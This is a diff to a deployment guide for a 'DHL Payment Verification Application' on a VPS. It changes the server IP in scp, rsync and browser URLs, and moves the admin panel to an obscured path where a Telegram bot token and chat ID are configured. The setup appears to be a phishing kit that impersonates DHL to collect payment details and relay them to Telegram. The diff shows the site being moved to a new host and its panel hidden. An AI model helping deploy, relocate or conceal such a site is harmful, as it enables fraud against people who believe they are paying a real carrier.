@@ -1,4 +1,4 @@
-# Deployment Guide for VPS (95.179.171.63)
+# Deployment Guide for VPS (209.250.233.145)
 
 This guide will help you deploy the DHL Payment Verification Application to your VPS.
 
@@ -90,14 +90,14 @@ git clone <your-repo-url> .
 **Option B: Using SCP from your local machine**
 ```bash
 # Run this from your local machine (not VPS)
-scp -r /path/to/your/project/* user@95.179.171.63:/var/www/dhl-payment-app/
+scp -r /path/to/your/project/* user@209.250.233.145:/var/www/dhl-payment-app/
 ```
 
 **Option C: Using rsync (recommended for updates)**
 ```bash
 # Run this from your local machine
 rsync -avz --exclude 'node_modules' --exclude 'dist' --exclude '.git' \
-  /path/to/your/project/ user@95.179.171.63:/var/www/dhl-payment-app/
+  /path/to/your/project/ user@209.250.233.145:/var/www/dhl-payment-app/
 ```
 
 ### 3.3 Create Environment File
@@ -250,14 +250,14 @@ sudo ufw enable
 
 Open your browser and visit:
 ```
-http://95.179.171.63
+http://209.250.233.145
 ```
 
 You should see the DHL payment page!
 
 ## Step 8: Setup Telegram Bot (Admin Panel)
 
-1. Visit: `http://95.179.171.63/admin`
+1. Visit: `http://209.250.233.145/panel-x7k9m2n5`
 2. Configure your Telegram Bot Token and Chat ID
 3. Test the connection
 
@@ -388,4 +388,4 @@ If you encounter any issues, check:
 
 ---
 
-**Your application should now be running at: http://95.179.171.63** 🎉
+**Your application should now be running at: http://209.250.233.145** 🎉
